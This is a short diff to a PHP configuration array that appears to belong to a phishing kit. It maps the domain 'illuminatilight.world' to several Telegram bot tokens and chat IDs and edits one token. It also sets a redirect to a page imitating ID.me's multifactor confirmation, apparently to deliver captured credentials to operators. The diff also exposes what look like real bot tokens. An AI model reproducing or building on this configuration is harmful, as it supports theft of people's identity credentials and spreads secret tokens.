@@ -51,7 +51,7 @@ $site_map = [
     'illuminatilight.world' => [
         "bots" => [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
-            ['token' => '8064658016:AAHEcSX8Y981ebjcAveqjyh-S8sGkrGnYiq4', 'chat_id' => '7575811693'],
+            ['token' => '8064658016:AAHEcSX8Y981ebjcAveqjyhS8sGkrGnYiq4', 'chat_id' => '7575811693'],
         ],
         "redirect" => "https://illuminatilight.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
     ],
